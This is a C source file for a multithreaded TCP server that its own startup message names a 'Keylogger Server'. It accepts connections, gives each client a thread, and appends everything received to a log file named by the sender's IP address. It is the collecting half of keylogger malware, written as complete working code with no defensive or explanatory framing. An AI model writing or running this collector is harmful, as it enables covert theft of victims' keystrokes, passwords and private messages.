#include "server.h"

void *handle_client(void *arg) {
    ClientData *client_info = (ClientData *)arg;
    int sock_fd = client_info->socket_fd;
    char ip_str[INET6_ADDRSTRLEN];
    strcpy(ip_str, client_info->ip_address);
    
    free(client_info); 

    char buffer[BUFFER_SIZE];
    char filepath[256];
    FILE *logfile;

    printf("[+] New connection established from %s\n", ip_str);

    snprintf(filepath, sizeof(filepath), "%s/log_%s.txt", LOG_DIR, ip_str);

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes_received = recv(sock_fd, buffer, BUFFER_SIZE - 1, 0);

        if (bytes_received <= 0) {
            printf("[-] Client %s disconnected.\n", ip_str);
            break;
        }

        logfile = fopen(filepath, "a");
        if (logfile) {
            fprintf(logfile, "%s", buffer);
            fclose(logfile);
        } else {
            perror("[-] Failed to open log file for writing");
        }
    }

    close(sock_fd);
    pthread_exit(NULL);
}

int main(void) {
    int socketfd, new_fd; 
    struct addrinfo hints, *servinfo, *p;
    struct sockaddr_storage their_addr;
    socklen_t sin_size;
    int yes = 1;

    mkdir(LOG_DIR, 0700);

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    
    if (getaddrinfo(NULL, SERVER_PORT, &hints, &servinfo) != 0) {
        fprintf(stderr, "getaddrinfo error\n");
        return 1;
    }

    for(p = servinfo; p != NULL; p = p->ai_next) {
        if ((socketfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }

        setsockopt(socketfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));

        if (bind(socketfd, p->ai_addr, p->ai_addrlen) == -1) {
            close(socketfd);
            continue;
        }
        break; 
    }

    freeaddrinfo(servinfo); 
    
    if (p == NULL) {
        fprintf(stderr, "server: failed to bind\n");
        exit(1);
    }

    if (listen(socketfd, BACKLOG) == -1) {
        perror("listen");
        exit(1);
    }
    
    printf("[*] Keylogger Server listening on port %s...\n", SERVER_PORT);

    while (1) {
        sin_size = sizeof their_addr;

        new_fd = accept(socketfd, (struct sockaddr *)&their_addr, &sin_size);
        if (new_fd == -1) {
            perror("accept error");
            continue;
        }

        ClientData *client_info = (ClientData *)malloc(sizeof(ClientData));
        if (!client_info) {
            perror("Failed to allocate memory for client data");
            close(new_fd);
            continue;
        }

        client_info->socket_fd = new_fd;
        inet_ntop(their_addr.ss_family, &(((struct sockaddr_in*)&their_addr)->sin_addr), client_info->ip_address, sizeof(client_info->ip_address));

        pthread_t thread_id;
        if (pthread_create(&thread_id, NULL, handle_client, (void *)client_info) != 0) {
            perror("Could not create client thread");
            free(client_info);
            close(new_fd);
            continue;
        }
        
        pthread_detach(thread_id);
    }
    
    return SUCCESS;
}